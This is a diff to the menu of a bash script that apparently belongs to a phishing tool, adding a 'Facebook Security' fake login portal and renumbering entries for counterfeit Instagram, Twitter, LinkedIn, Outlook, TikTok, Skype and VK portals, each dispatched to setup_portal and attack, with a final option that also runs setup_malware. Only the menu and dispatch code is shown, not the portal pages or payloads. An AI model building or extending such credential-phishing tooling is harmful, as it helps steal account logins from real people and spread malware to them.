@@ -345,14 +345,15 @@ portal_menu() {
 		${GREEN}[${WHITE}3${GREEN}]${CYAN} Windows
 		${GREEN}[${WHITE}4${GREEN}]${CYAN} Gnu/linux
 		${GREEN}[${WHITE}5${GREEN}]${CYAN} Facebook
-		${GREEN}[${WHITE}6${GREEN}]${CYAN} Instagram
-		${GREEN}[${WHITE}7${GREEN}]${CYAN} Twitter
-		${GREEN}[${WHITE}8${GREEN}]${CYAN} Linkedin
-		${GREEN}[${WHITE}9${GREEN}]${CYAN} Outlook
-		${GREEN}[${WHITE}10${GREEN}]${CYAN} Tiktok
-		${GREEN}[${WHITE}11${GREEN}]${CYAN} Skype
-		${GREEN}[${WHITE}12${GREEN}]${CYAN} VK
-		${GREEN}[${WHITE}13${GREEN}]${CYAN} Malware
+		${GREEN}[${WHITE}6${GREEN}]${CYAN} Facebook Security
+		${GREEN}[${WHITE}7${GREEN}]${CYAN} Instagram
+		${GREEN}[${WHITE}8${GREEN}]${CYAN} Twitter
+		${GREEN}[${WHITE}9${GREEN}]${CYAN} Linkedin
+		${GREEN}[${WHITE}10${GREEN}]${CYAN} Outlook
+		${GREEN}[${WHITE}11${GREEN}]${CYAN} Tiktok
+		${GREEN}[${WHITE}12${GREEN}]${CYAN} Skype
+		${GREEN}[${WHITE}13${GREEN}]${CYAN} VK
+		${GREEN}[${WHITE}14${GREEN}]${CYAN} Malware
 		${GREEN}[${WHITE}99${GREEN}]${ORANGE} Menu
 		
 		
@@ -392,54 +393,60 @@ portal_menu() {
 	        
 	        
 	    6) 
+	        portal_login="facebook_security"
+	        setup_portal 
+	        attack;; 
+	        
+	        
+	    7) 
 	        portal_login="instagram"
 	        setup_portal 
 	        attack;; 
 	    
 	    
-	    7) 
+	    8) 
 	        portal_login="twitter"
 	        setup_portal 
 	        attack;; 
 	    
 	    
 	    
-	    8) 
+	    9) 
 	        portal_login="linkedin"
 	        setup_portal 
 	        attack;; 
 	    
 	    
 	    
-	    9) 
+	    10) 
 	        portal_login="outlook"
 	        setup_portal 
 	        attack;; 
 	    
 	    
 	   
-	    10) 
+	    11) 
 	        portal_login="tiktok"
 	        setup_portal 
 	        attack;; 
 	    
 	    
 	    
-	    11) 
+	    12) 
 	        portal_login="skype"
 	        setup_portal 
 	        attack;; 
 	    
 	    
 	    
-	    12) 
+	    13) 
 	        portal_login="vk"
 	        setup_portal 
 	        attack;; 
 	    
 	    
 	    
-	    13) 
+	    14) 
 	        portal_login="malware"
 	        setup_portal
 	        setup_malware 
